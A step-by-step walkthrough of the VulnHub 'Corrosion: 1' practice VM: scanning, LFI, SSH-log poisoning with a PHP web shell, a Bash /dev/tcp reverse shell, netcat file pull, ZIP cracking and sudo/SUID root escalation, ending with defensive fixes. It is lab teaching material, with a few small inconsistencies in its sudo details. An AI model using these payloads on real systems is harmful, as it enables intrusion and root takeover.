# Corrosion: 1 (VulnHub) β€” A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | Corrosion: 1 |
| **Difficulty** | Easy |
| **Author** | Proxy Programmer |
| **Released** | 31 July 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/corrosion-1,730/ |
| **Download** | https://download.vulnhub.com/corrosion/Corrosion.ova |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache/2.4.46) |
| **Author Hint** | "Enumerate Property." β€” enumeration is the whole game here |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the Corrosion VM is `192.168.56.101`. Substitute your own
> IPs if your host-only network uses a different range. Corrosion ships as an
> `.ova`; import it into VirtualBox/VMware and put both VMs on the same
> host-only network so they can see each other.

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** β€” finding the target VM's IP address on your local network.
2. **Port & service scanning** β€” running `nmap` to see what is listening.
3. **Web directory enumeration** β€” using `gobuster`/`dirb` to find hidden pages.
4. **Parameter fuzzing** β€” using `wfuzz`/`ffuf` to discover a hidden URL parameter.
5. **Local File Inclusion (LFI)** β€” reading arbitrary files through a broken PHP page.
6. **Log poisoning** β€” turning a file-read bug into remote code execution (RCE)
   by writing PHP into `/var/log/auth.log` through failed SSH logins.
7. **Reverse shells** β€” catching an interactive `www-data` shell with `nc`.
8. **Password cracking** β€” extracting an encrypted ZIP and cracking it with `john`.
9. **Lateral movement** β€” pivoting from `www-data` to the user `randy`.
10. **Privilege escalation** β€” abusing a `sudo`-allowed helper binary to become `root`.

It is aimed at someone who has never finished a CTF box before. Take it slowly;
read every "Why it works" note.

> **The intended chain in one breath:** nmap shows SSH + HTTP β†’ gobuster finds
> a task list and a PHP log viewer β†’ the PHP page has an `file` parameter that is
> a Local File Inclusion β†’ the task list tells us the auth log has bad
> permissions β†’ we poison the auth log via SSH usernames to get RCE β†’ `www-data`
> shell β†’ find an encrypted backup ZIP β†’ crack it β†’ get `randy`'s password and
> his passwordless `sudo` helper β†’ replace the helper with our own binary β†’ root.

---

## 1. Reconnaissance β€” finding the target

First we need the target's IP address. If you already set the VM's network
adapter to a host-only network, the address is usually the same each boot, but
let's confirm it.

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` prints every network interface and its assigned IP.
> Our attacker is `192.168.56.10/24`, so the `/24` tells us the whole subnet is
> `192.168.56.0β€“255`. The target must be somewhere in that range.

### 1.2 Sweep the subnet for the target

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.1    08:00:27:xx:xx:xx   PCS Systemtechnik GmbH   (VirtualBox host)
192.168.56.10   08:00:27:aa:aa:aa   PCS Systemtechnik GmbH   (our Kali)
192.168.56.101  08:00:27:bb:bb:bb   PCS Systemtechnik GmbH   <-- target
```

Alternatively, with `netdiscover`:

```bash
sudo netdiscover -r 192.168.56.0/24
```

> **Why it works:** both tools send ARP requests ("who has this IP?") across the
> local subnet and list everyone who answers. ARP only works on your own local
> network, which is exactly where our lab VMs live. The VirtualBox NIC prefix
> `08:00:27` confirms the answer is a VM.

![Finding the target IP](images/01-arp-scan.png)

**Target confirmed: `192.168.56.101`.**

---

## 2. Enumeration β€” open ports and services

Enumeration is the hint for this box, so we spend real effort here.

### 2.1 Full TCP port scan with service detection

```bash
sudo nmap -sC -sV -p- -oN corrosion.nmap 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:**
> - `-p-` scans **all** 65535 ports, not just the common 1000. Always do this on
>   CTFs β€” services hide on high ports.
> - `-sV` fingerprints the version behind each open port.
> - `-sC` runs Nmap's default "safe" scripts, which often reveal titles, headers,
>   and minor misconfigurations for free.
> - `-oN corrosion.nmap` saves the output so you can grep it later without
>   re-scanning.

Only two services matter: **SSH (22)** and **HTTP (80)**. Some writeups mention
an extra web port on other builds, but on the stock Corrosion VM the classic
path is 22 + 80. (If your scan shows `8080`, enumerate it the same way β€” it is
not required for the intended chain.)

### 2.2 Look at the web server

```bash
curl -s http://192.168.56.101/ | head
```

```text
<title>Apache2 Ubuntu Default Page: It works</title>
```

The landing page is the boring default Apache page β€” nothing to click. On CTFs
that almost always means the good stuff is in a **directory we haven't guessed**.
So we enumerate directories.

### 2.3 Directory busting with gobuster

```bash
gobuster dir -u http://192.168.56.101 -x php,html,txt \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o gobuster-root.log
```

```text
/blog-post            (Status: 301) [Size: 316]
/tasks                (Status: 301) [Size: 306]
/backups              (Status: 301) [Size: 312]
/index.html           (Status: 200) [Size: 10918]
```

> **Why it works:** `gobuster dir` requests `http://target/<word>` for every word
> in the wordlist and reports the ones that don't return "404 Not Found". A
> `301` (Moved Permanently) tells us a directory exists but needs a trailing
> slash. The `-x php,html,txt` flag also tries each word with those extensions
> appended.

Two interesting hits: `/tasks` and `/blog-post`. Let's walk both.

### 2.4 The task list β€” a giant hint

```bash
curl -s http://192.168.56.101/tasks/
```

```text
Index of /tasks
[ ] tasks_todo.txt
```

```bash
curl -s http://192.168.56.101/tasks/tasks_todo.txt
```

```text
1. Change permissions for auth log
2. Change port 22 -> 7672
3. Set up phpMyAdmin
```

> **Why it works:** directory listing is enabled, so Apache shows the files.
> This `tasks_todo.txt` is the author's roadmap for the attack:
> - **"Change permissions for auth log"** β†’ the `/var/log/auth.log` file is
>   world-readable, which is *abnormal* and a huge hint toward log poisoning.
> - **"Change port 22 β†’ 7672"** β†’ SSH is *still* on 22, so we can still log in
>   (and still poison logs) there.
> - **"Set up phpMyAdmin"** β†’ not done yet, ignore it. Classic rabbit hole.

### 2.5 The blog and its archives

```bash
gobuster dir -u http://192.168.56.101/blog-post -x php,html,txt \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -o gobuster-blog.log
```

```text
/uploads     (Status: 301)
/archives    (Status: 301)
/icons       (Status: 301)
```

Browse the archive directory:

```bash
curl -s http://192.168.56.101/blog-post/archives/
```

```text
Index of /blog-post/archives
[ ] randylogs.php
```

> **Why it works:** this looks like a half-finished "blog" CMS. The page
> `/blog-post/` shows a user named **randy**, and `archives/` contains a single
> PHP file, `randylogs.php`. The name ("randy logs") plus the task list point
> straight at it.

Fetching `randylogs.php` directly returns an **empty** body:

```bash
curl -s -i http://192.168.56.101/blog-post/archives/randylogs.php
```

```text
HTTP/1.1 200 OK
Content-Length: 0
```

> **Why it works:** a PHP file that returns an empty body but a `200 OK` means
> the code ran β€” it just didn't print anything because it expected an input we
> haven't supplied. That input is a URL parameter, and we need to guess its name.

![Directory busting results](images/02-gobuster.png)

---

## 3. Foothold β€” gaining the first shell

### 3.1 Discover the hidden parameter with fuzzing

We know `randylogs.php` reads *something*. Let's brute-force the parameter name.
The `FUZZ` keyword is replaced by each word in the wordlist.

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt \
  --hl 0 \
  -u "http://192.168.56.101/blog-post/archives/randylogs.php?FUZZ=/etc/passwd"
```

Or with `ffuf`:

```bash
ffuf -u "http://192.168.56.101/blog-post/archives/randylogs.php?FUZZ=/etc/passwd" \
  -w /usr/share/seclists/Discovery/Web-Content/big.txt -fs 0
```

```text
file                    [Status: 200, Size: 1337]
```

> **Why it works:**
> - `--hl 0` (wfuzz) / `-fs 0` (ffuf) **hide every response of length 0**. Most
>   wrong parameter names make the script print nothing, so by hiding those we
>   surface the handful of responses that actually returned data.
> - The winner is a parameter literally called **`file`**. That is a giant red
>   flag: a PHP script that includes a file the user names.

### 3.2 Confirm the Local File Inclusion (LFI)

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
...
randy:x:1000:1000:randy,,,:/home/randy:/bin/bash
```

> **Why it works:** the page echoed the whole of `/etc/passwd`. That is a
> textbook **Local File Inclusion** β€” the script does something like
> `include($_GET['file'])`, so we can read any file the web server user
> (`www-data`) is allowed to read. We also learn a real account exists:
> **`randy`**.

Now read the auth log the task list pointed us at:

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log" | tail
```

```text
Jul 31 10:00:01 corrosion CRON[1201]: pam_unix(cron:session): session opened for user root
```

> **Why it works:** `auth.log` is normally root-only, but the misconfiguration
> flagged in `tasks_todo.txt` left it **world-readable** (recall the root crontab
> runs `chmod 775 -R /var/log/auth.log` every minute). Because our LFI can read
> it, and because PHP will happily **execute** PHP code it finds inside an
> included file, we can turn read-access into code execution.

### 3.3 Log poisoning β€” writing PHP into the log

Every failed SSH login records the **username** we tried. If our username is PHP
code, that code ends up inside `auth.log`. The `randylogs.php` script then
includes the log β€” and executes our code.

First, prove we can write to the log with a harmless name:

```bash
ssh write_test@192.168.56.101
```

```text
write_test@192.168.56.101's password:
Permission denied, please try again.
```

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log" | grep write_test
```

```text
Jul 31 10:05:11 corrosion sshd[1500]: Invalid user write_test from 192.168.56.10
Jul 31 10:05:13 corrosion sshd[1500]: Failed password for invalid user write_test
```

> **Why it works:** SSH logs *who* tried to connect, even for made-up users, and
> this log is SSH-reachable on port 22. We control the username string, so we
> control what gets written into the file.

Now poison the log with a PHP web shell as the username:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@192.168.56.101
```

```text
<?php system($_GET["cmd"]); ?>@192.168.56.101's password:
Permission denied, please try again.
```

> **Why it works:** the username is now `<?php system($_GET["cmd"]); ?>`, so that
> exact text sits inside `auth.log`. When `randylogs.php` includes the log and
> PHP processes it, the `<?php ... ?>` block runs. `system()` executes whatever is
> in the `cmd` GET parameter. **Note:** in `auth.log` this string is truncated to
> the first space, so keep the payload compact.

Test code execution:

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** we never saw the literal `<?php ... ?>` text back β€” we saw
> the *output of `id`* instead. That proves the server executed our injected PHP.
> We now have **Remote Code Execution** as `www-data`.

![LFI confirmed reading /etc/passwd](images/03-lfi-passwd.png)

### 3.4 Catch a reverse shell

Start a listener on Kali:

```bash
nc -nlvp 9001
```

In another terminal, trigger a Bash reverse shell through the web shell. URL-encode
the payload so the spaces and special characters survive:

```bash
curl -s "http://192.168.56.101/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.56.10/9001%200%3E%261%27"
```

Back in the `nc` window:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 57712
www-data@corrosion:/var/www/html/blog-post/archives$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Why it works:** `/dev/tcp/<ip>/<port>` is a Bash-only pseudo-device: opening
> it makes Bash connect out to our listener, and `0>&1` wires stdin/stdout/stderr
> to that socket. We have a full interactive shell as `www-data`.

Optionally upgrade to a stable TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** this asks Python to give us a real pseudo-terminal, so tools
> like `sudo` and text editors behave normally instead of complaining about a
> "dumb terminal".

![Reverse shell as www-data](images/04-reverse-shell.png)

---

## 4. Privilege escalation β€” becoming root

### 4.1 Enumerate the filesystem as www-data

```bash
ls -la /home
ls -la /var/backups
```

```text
total 12
... randy/          <-- only real user

total 24
-rw-r--r-- 1 root root  1784 ... user_backup.zip   <-- readable by everyone!
```

> **Why it works:** `/var/backups/user_backup.zip` is **world-readable**. A
> password-protected ZIP named "user backup" is exactly the kind of thing an
> admin leaks. We can read the file even as the low-privileged web user.

### 4.2 Copy the ZIP to Kali

Serve it from the target over HTTP:

```bash
cd /var/backups
python3 -m http.server 8000
```

Then on Kali:

```bash
wget http://192.168.56.101:8000/user_backup.zip
```

(No `curl`/`wget` on the target? Push it with netcat instead:

```bash
# on Kali
nc -lvnp 1111 > user_backup.zip
# on target
cat user_backup.zip > /dev/tcp/192.168.56.10/1111
```

)

> **Why it works:** plain HTTP or netcat both move raw bytes; either way we now
> have the encrypted archive locally where we can crack it with better hardware.

### 4.3 Crack the ZIP password

Convert the ZIP to a crackable hash and feed it to John the Ripper:

```bash
zip2john user_backup.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
john --show zip.hash
```

```text
user_backup.zip:!randybaby
```

(`fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt user_backup.zip` works too.)

> **Why it works:** `zip2john` extracts the ZIP's password verifier into a format
> John understands; John then tries every password in `rockyou.txt` until the
> verifier matches. The password is weak, so it falls in under a second.

### 4.4 Extract and pivot to randy

```bash
unzip user_backup.zip -d backup
ls backup
```

```text
id_rsa  id_rsa.pub  my_password.txt  easysysinfo.c
cat backup/my_password.txt
```

```text
randylovesgoldfish1998
```

> **Why it works:** the archive contained `randy`'s **private SSH key**
> (`id_rsa`) and a plaintext file with his **SSH password**. Either grants us the
> `randy` account.

Log in as `randy`:

```bash
ssh randy@192.168.56.101
# password: randylovesgoldfish1998
```

```text
randy@corrosion:~$ id
uid=1000(randy) gid=1000(randy) groups=1000(randy),4(adm),...
randy@corrosion:~$ cat /home/randy/user.txt 2>/dev/null || cat user.txt
FLAG: 98342721012390839081
```

> **Why it works:** we now own a normal user account and can read the user flag.
> The real prize, though, is what `randy` is allowed to do as **root**.

### 4.5 Check sudo rights

```bash
sudo -l
```

```text
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:...:/bin:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
```

> **Why it works:** `sudo -l` lists the exact commands this user may run as root.
> `randy` may run **`/home/randy/tools/easysysinfo`** β€” a helper that lives in
> *randy's own home directory*.

### 4.6 Inspect the helper

```bash
cat /home/randy/tools/easysysinfo.c
ls -la /home/randy/tools/easysysinfo
```

```c
#include <unistd.h>
void main()
{
  setuid(0);
  setgid(0);
  system("/usr/bin/date");
  system("cat /etc/hosts");
  system("/usr/bin/uname -a");
}
```

```text
-rwsr-xr-x 1 root root ... easysysinfo   <-- SUID root, and root-owned
```

> **Why it works and why it's exploitable:** two problems combine.
> 1. The program calls `cat` **without an absolute path**. Normally sudo uses a
>    `secure_path`, but the binary is also **SUID root**, so when it runs, the
>    first matching `cat` on our `PATH` executes as root.
> 2. `sudoers` authorises the command by **path only**, not content. The file is
>    root-owned, but the **directory `/home/randy/tools/` is owned by randy**, so
>    randy can delete or replace the binary.

### 4.7 Exploit β€” overwrite the helper with our own binary

Because randy owns the directory, rename the original and drop in a program of
our own:

```bash
cd /home/randy/tools
mv easysysinfo easysysinfo.orig
```

Create a tiny C program that spawns a root shell:

```bash
cat > easysysinfo.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>
int main(void)
{
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF
```

Compile it (the target has `gcc`), then run it through sudo:

```bash
gcc easysysinfo.c -o easysysinfo
sudo /home/randy/tools/easysysinfo
```

```text
root@corrosion:/home/randy/tools# id
uid=0(root) gid=0(root) groups=0(root)
root@corrosion:~# cat /root/root.txt
FLAG: 4NJSA99SD7922197D7S90PLAWE
```

> **Why it works:** `sudo` trusted the *path* `/home/randy/tools/easysysinfo`
> and ran whatever file was there as root. That file is now our compiled
> program, which calls `setuid(0)` and drops us into a root Bash. Game over.

**Alternative (PATH abuse) route.** Same weakness, different trigger: keep the
original SUID binary, but put a malicious `cat` earlier in `PATH`, then run the
original helper directly (no sudo needed for that part because the binary is SUID):

```bash
echo 'chmod +s /bin/bash' > /home/randy/tools/cat
chmod +x /home/randy/tools/cat
export PATH=/home/randy/tools:$PATH
/home/randy/tools/easysysinfo
/bin/bash -p
```

> **Why it works:** the helper runs `system("cat /etc/hosts")`. With our fake
> `cat` first in `PATH`, that line runs *our* script as root, which makes
> `/bin/bash` SUID. Launching it with `-p` (preserve SUID privileges) yields a
> root shell. Both routes reach the same destination.

![Root shell captured](images/05-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **Directory listing enabled** | `/tasks/`, `/blog-post/archives/` | Leaks file names and the `tasks_todo.txt` roadmap | Disable `Options Indexes`; add `index.html` |
| 2 | **Local File Inclusion (LFI)** | `randylogs.php?file=` | Reads any file the web user can read | Never pass user input to `include()`; use an allow-list |
| 3 | **Log poisoning β†’ RCE** | Injected PHP in `/var/log/auth.log` | Remote command execution as `www-data` | Fix log permissions; do not include logs in PHP |
| 4 | **World-readable log file** | `/var/log/auth.log` (0775 via crontab) | Enables log poisoning after the LFI | Restrict logs to root (`0640`) |
| 5 | **World-readable backup archive** | `/var/backups/user_backup.zip` | Leaks SSH key + plaintext password | Store backups outside web/LAN perms; encrypt properly |
| 6 | **Weak ZIP password** | `user_backup.zip` (`!randybaby`) | Trivially cracked offline | Use strong passphrases / key-based secrets |
| 7 | **Sensitive files in backup** | `id_rsa`, `my_password.txt` | Direct account takeover of `randy` | Never back up private keys with their passphrases |
| 8 | **sudo helper replaceable by owner** | `/home/randy/tools/easysysinfo` | Full root compromise | Put admin binaries in root-owned dirs; validate content |
| 9 | **Relative-path `cat` in SUID program** | `system("cat /etc/hosts")` | PATH/SOID abuse β†’ root | Always use absolute paths in SUID/root helpers |

---

## 6. Defensive lessons (blue team)

- **Turn off directory listings.** A single `Indexes` option gave the attacker a
  to-do list describing the intended exploit chain.
- **Never build file inclusion from user input.** `include($_GET['file'])` is the
  root cause of both the file read and the RCE. Use an allow-list of known files
  or a fixed mapping from keys to paths.
- **Keep authentication logs root-only.** `auth.log` should be `0640 root:adm`.
  A cron job that *loosens* it to `0775` every minute is a self-inflicted
  vulnerability.
- **Do not let logs be interpreted as code.** Even if a log is readable, nothing
  should ever `include()` or `eval()` its contents.
- **Treat backups as secrets.** An off-LAN, encrypted backup with a strong
  passphrase, storing no private keys next to their own password file, avoids the
  entire second half of this attack.
- **Harden sudo helpers.** Place privileged helper binaries in root-owned
  directories that the calling user cannot write to, authorise by full content or
  a checksum, and never call other programs by a bare name inside an elevated
  program (use absolute paths, and drop SUID if sudo already elevates).
- **Least privilege for the web user.** `www-data` should not be able to reach
  meaningful data under `/home` or `/var/backups`.
- **Monitor for log injection.** Usernames containing `<?php` are a loud,
  detectable signal β€” alert on anomalous login-attempt strings.

---

## 7. References

- VulnHub β€” Corrosion: 1 entry: https://vulnhub.com/entry/corrosion-1,730/
- Corrosion.ova download mirror: https://download.vulnhub.com/corrosion/Corrosion.ova
- NepCodeX walkthrough: https://nepcodex.com/2021/08/corrosion-walkthrough-vulnhub-writeup/
- GrumpyGeekWrites walkthrough: https://grumpygeekwrites.wordpress.com/2021/08/26/vulnhub-corrosion-walk-through-tutorial-writeup/
- Infosec Institute β€” Corrosion 1 walkthrough (part 1): https://www.infosecinstitute.com/resources/capture-the-flag/corrosion-1-vulnhub-ctf-walkthrough-part-one/
- ArtilleryRed (Medium) writeup: https://artilleryred.medium.com/vulnhub-writeup-of-corrosion-7a5859ce84d8
- Hackatua walkthrough: https://www.hackatua.com/walkthroughs/corrosion-1
- devl00p β€” alternative LFI-to-RCE (php filter chains): https://devl00p.github.io/posts/Solution-du-CTF-Corrosion-de-VulnHub/
- Enes Γ–zkΔ±rdeniz (Medium) walkthrough: https://medium.com/@ozkirdenizenes/corrosion-1-walkthrough-5ad3a1b0b418
- Ch15hu1 writeup (Chinese): https://www.cnblogs.com/vuln/p/17677565.html

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-arp-scan.png` β€” `arp-scan`/`netdiscover` showing `192.168.56.101`
- [ ] `images/02-gobuster.png` β€” gobuster discovering `/tasks` and `/blog-post`
- [ ] `images/03-lfi-passwd.png` β€” `/etc/passwd` read through `randylogs.php?file=`
- [ ] `images/04-reverse-shell.png` β€” `www-data` shell caught in `nc`
- [ ] `images/05-root-shell.png` β€” `id` showing `uid=0(root)` and `root.txt`
- [ ] `images/06-tasks-todo.png` β€” the `tasks_todo.txt` hint file
- [ ] `images/07-wfuzz-file.png` β€” `wfuzz`/`ffuf` discovering the `file` parameter
- [ ] `images/08-authlog-poison.png` β€” injected PHP payload visible in `auth.log`
- [ ] `images/09-zip2john.png` β€” `zip2john` + `john` cracking `!randybaby`
- [ ] `images/10-sudo-l.png` β€” `sudo -l` showing the `easysysinfo` helper

---

*Corrosion: 1 is an excellent first box: every step is a clue leading to the next,
and the "Enumeration is key" hint rewards patience. Try to solve each stage
yourself before reading ahead β€” the learning is in the enumeration.*
